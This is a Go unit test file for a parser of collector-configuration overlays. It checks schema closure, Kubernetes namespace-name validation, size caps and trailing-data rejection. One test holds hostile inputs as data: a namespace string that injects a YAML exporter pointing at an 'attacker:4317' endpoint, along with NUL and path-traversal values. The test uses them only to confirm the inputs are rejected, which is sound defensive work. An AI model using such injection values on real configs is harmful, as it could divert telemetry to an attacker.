package collection

import (
	"encoding/json"
	"fmt"
	"strings"
	"testing"
)

func TestParseOverlay_Empty(t *testing.T) {
	ov, err := ParseOverlay("")
	if err != nil {
		t.Fatalf("ParseOverlay(\"\"): %v", err)
	}
	if !ov.Empty() {
		t.Fatalf("ParseOverlay(\"\") = %+v, want Empty()", ov)
	}
}

func TestParseOverlay_Valid(t *testing.T) {
	ov, err := ParseOverlay(`{"obiEnabled":false,"excludeNamespaces":["payments"]}`)
	if err != nil {
		t.Fatalf("ParseOverlay: %v", err)
	}
	if ov.ObiEnabled == nil || *ov.ObiEnabled != false {
		t.Fatalf("ObiEnabled = %v, want pointer to false", ov.ObiEnabled)
	}
	if ov.ExcludeNamespaces == nil || len(*ov.ExcludeNamespaces) != 1 || (*ov.ExcludeNamespaces)[0] != "payments" {
		t.Fatalf("ExcludeNamespaces = %v, want [payments]", ov.ExcludeNamespaces)
	}
	if ov.Empty() {
		t.Fatalf("ParseOverlay with fields set reported Empty()")
	}
}

func TestParseOverlay_RejectsUnknownFields(t *testing.T) {
	if _, err := ParseOverlay(`{"freeformCollectorConfig":"whatever"}`); err == nil {
		t.Fatal("ParseOverlay accepted an unknown field — the schema must be closed")
	}
}

func TestParseOverlay_RejectsEmptyNamespaceEntry(t *testing.T) {
	if _, err := ParseOverlay(`{"excludeNamespaces":[""]}`); err == nil {
		t.Fatal("ParseOverlay accepted an empty namespace entry")
	}
}

// Namespace strings are rendered into the sensor's collector config by the
// applier, so anything that isn't a legal Kubernetes namespace name is
// rejected here, at the trust boundary — a newline or quote would be config
// injection downstream.
func TestParseOverlay_RejectsInvalidNamespaceNames(t *testing.T) {
	for _, name := range []string{
		"prod\n  exporters:\n    otlp/evil:\n      endpoint: attacker:4317", // config injection
		"   ",                   // whitespace-only
		"ns\x00evil",            // NUL
		"*",                     // glob
		"../../etc/passwd",      // traversal-shaped
		"UPPERCASE",             // not a DNS-1123 label
		"under_score",           // not a DNS-1123 label
		"-leading-dash",         // must start alphanumeric
		"trailing-dash-",        // must end alphanumeric
		strings.Repeat("a", 64), // over the 63-char namespace limit
	} {
		raw := `{"excludeNamespaces":["` + strings.ReplaceAll(strings.ReplaceAll(name, `\`, `\\`), "\n", `\n`) + `"]}`
		if _, err := ParseOverlay(raw); err == nil {
			t.Errorf("ParseOverlay accepted invalid namespace %q", name)
		}
	}
}

func TestParseOverlay_AcceptsValidNamespaceNames(t *testing.T) {
	ov, err := ParseOverlay(`{"excludeNamespaces":["kube-system","payments","x","ns1-2-3"]}`)
	if err != nil {
		t.Fatalf("ParseOverlay rejected valid namespace names: %v", err)
	}
	if ov.ExcludeNamespaces == nil || len(*ov.ExcludeNamespaces) != 4 {
		t.Fatalf("ExcludeNamespaces = %v, want 4 entries", ov.ExcludeNamespaces)
	}
}

func TestParseOverlay_RejectsOversizeNamespaceList(t *testing.T) {
	names := make([]string, maxExcludeNamespaces+1)
	for i := range names {
		names[i] = fmt.Sprintf("ns-%d", i)
	}
	blob, err := json.Marshal(map[string][]string{"excludeNamespaces": names})
	if err != nil {
		t.Fatalf("marshalling fixture: %v", err)
	}
	if _, err := ParseOverlay(string(blob)); err == nil {
		t.Fatalf("ParseOverlay accepted %d namespaces, over the %d cap", len(names), maxExcludeNamespaces)
	}
}

// A top-level null decodes into a struct as a no-op, so it would otherwise
// read as the empty overlay and silently reset all collection config.
func TestParseOverlay_RejectsNull(t *testing.T) {
	if _, err := ParseOverlay("null"); err == nil {
		t.Fatal("ParseOverlay accepted a top-level null — that would silently reset the overlay")
	}
}

// json.Decoder.Decode stops after the first value, so without an explicit
// end-of-input check a body could smuggle arbitrary trailing content past the
// closed schema.
func TestParseOverlay_RejectsTrailingData(t *testing.T) {
	for _, raw := range []string{
		`{"obiEnabled":true} {"freeformCollectorConfig":"x"}`,
		`{"obiEnabled":true} not json at all`,
		`{"obiEnabled":true}{}`,
	} {
		if _, err := ParseOverlay(raw); err == nil {
			t.Fatalf("ParseOverlay(%q) accepted trailing data — the whole input must be the overlay", raw)
		}
	}
}

func TestOverlay_EncodeParseRoundTrip(t *testing.T) {
	obi := false
	ns := []string{"payments", "billing"}
	want := Overlay{ObiEnabled: &obi, ExcludeNamespaces: &ns}

	encoded, err := want.Encode()
	if err != nil {
		t.Fatalf("Encode: %v", err)
	}
	got, err := ParseOverlay(encoded)
	if err != nil {
		t.Fatalf("ParseOverlay(Encode()): %v", err)
	}
	if got.ObiEnabled == nil || *got.ObiEnabled != false {
		t.Fatalf("round-trip ObiEnabled = %v, want false", got.ObiEnabled)
	}
	if got.ExcludeNamespaces == nil || len(*got.ExcludeNamespaces) != 2 {
		t.Fatalf("round-trip ExcludeNamespaces = %v, want 2 entries", got.ExcludeNamespaces)
	}
}
